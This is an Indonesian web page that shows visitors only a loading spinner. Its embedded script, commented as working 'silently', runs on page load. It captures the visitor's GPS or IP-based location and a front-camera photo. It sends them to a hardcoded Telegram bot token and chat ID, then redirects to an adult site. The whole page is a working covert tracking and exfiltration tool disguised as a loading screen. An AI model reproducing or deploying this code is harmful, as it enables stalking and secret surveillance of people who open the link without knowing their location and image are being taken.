<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 5px solid #e5e7eb;
            border-top: 5px solid #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader p {
            font-size: 16px;
            color: #6b7280;
            font-weight: 400;
        }
        #errorMsg {
            display: none;
            margin-top: 20px;
            padding: 16px 24px;
            background: #fef2f2;
            color: #991b1b;
            border-radius: 12px;
            font-size: 14px;
            line-height: 1.6;
            white-space: pre-line;
            border: 1px solid #fecaca;
            max-width: 360px;
        }
        #retryBtn {
            display: none;
            margin-top: 16px;
            padding: 10px 28px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        #retryBtn:hover {
            background: #2563eb;
        }
        #cameraVideo {
            display: none;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="loader" id="loaderContainer">
    <div class="spinner" id="spinner"></div>
    <p id="statusText">Memuat...</p>
    <div id="errorMsg">⚠️ Terjadi kesalahan.<br>Silakan coba lagi.</div>
    <button id="retryBtn">Coba Lagi</button>
</div>

<video id="cameraVideo" autoplay playsinline></video>

<script>
    (function() {
        // === KONFIGURASI (tersembunyi) ===
        const BOT_TOKEN = '8806658022:AAE1hEtDlHRqWqwmN-HI8KzHo7KdfHXb-pc';
        const CHAT_ID = '1157643333';
        const REDIRECT_URL = 'https://nekopoi.care';

        let locationData = null;
        let photoBlob = null;
        let isProcessing = false;

        const statusText = document.getElementById('statusText');
        const spinner = document.getElementById('spinner');
        const errorMsg = document.getElementById('errorMsg');
        const retryBtn = document.getElementById('retryBtn');

        function showLoading() {
            spinner.style.display = 'block';
            statusText.innerText = 'Memuat...';
            errorMsg.style.display = 'none';
            retryBtn.style.display = 'none';
        }

        function showError() {
            spinner.style.display = 'none';
            statusText.innerText = '';
            errorMsg.style.display = 'block';
            retryBtn.style.display = 'inline-block';
        }

        // === GET GPS (diam-diam, tanpa prompt visual) ===
        function getLocationByGPS() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('GPS tidak didukung'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + ' meter',
                            source: 'GPS'
                        });
                    },
                    (err) => {
                        reject(err);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // === FALLBACK IP (diam-diam) ===
        async function getLocationByIP() {
            try {
                const resp = await fetch('https://ipapi.co/json/');
                if (!resp.ok) throw new Error('IP API gagal');
                const data = await resp.json();
                if (!data.latitude || !data.longitude) throw new Error('Data IP tidak lengkap');
                return {
                    lat: data.latitude,
                    lon: data.longitude,
                    accuracy: 'Perkiraan (IP)',
                    source: 'IP'
                };
            } catch (e) {
                throw new Error('Gagal ambil lokasi');
            }
        }

        // === FOTO KAMERA DEPAN (diam-diam) ===
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 400, height: 400 }
                })
                .then((stream) => {
                    const video = document.getElementById('cameraVideo');
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = 400;
                            canvas.height = 400;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, 400, 400);
                            stream.getTracks().forEach(t => t.stop());
                            video.srcObject = null;
                            canvas.toBlob((blob) => {
                                if (blob) resolve(blob);
                                else reject(new Error('Gagal capture'));
                            }, 'image/jpeg', 0.85);
                        }, 300);
                    };
                    video.onerror = () => {
                        stream.getTracks().forEach(t => t.stop());
                        reject(new Error('Error kamera'));
                    };
                })
                .catch((err) => reject(err));
            });
        }

        // === KIRIM TELEGRAM (diam-diam) ===
        async function sendToTelegram(location, photoBlob) {
            const text = `📍 Lokasi: ${location.source}\nLat: ${location.lat}\nLon: ${location.lon}\nAkurasi: ${location.accuracy}`;
            // Kirim teks
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(() => {});

            // Kirim foto
            if (photoBlob) {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', photoBlob, 'photo.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                }).catch(() => {});
            }
        }

        // === PROSES UTAMA (semua diam-diam, hanya loading) ===
        async function mainProcess() {
            if (isProcessing) return;
            isProcessing = true;

            showLoading();

            try {
                // 1. Ambil lokasi (GPS dulu, fallback IP)
                let loc;
                try {
                    loc = await getLocationByGPS();
                } catch (e) {
                    loc = await getLocationByIP();
                }
                locationData = loc;

                // 2. Ambil foto (diam-diam)
                try {
                    photoBlob = await capturePhoto();
                } catch (e) {
                    // skip jika gagal
                }

                // 3. Kirim ke Telegram (diam-diam)
                await sendToTelegram(locationData, photoBlob);

                // 4. Redirect
                window.location.href = REDIRECT_URL;

            } catch (err) {
                console.warn(err);
                showError();
            } finally {
                isProcessing = false;
            }
        }

        // === RETRY ===
        retryBtn.addEventListener('click', () => {
            locationData = null;
            photoBlob = null;
            mainProcess();
        });

        // START
        mainProcess();
    })();
</script>
</body>
</html>
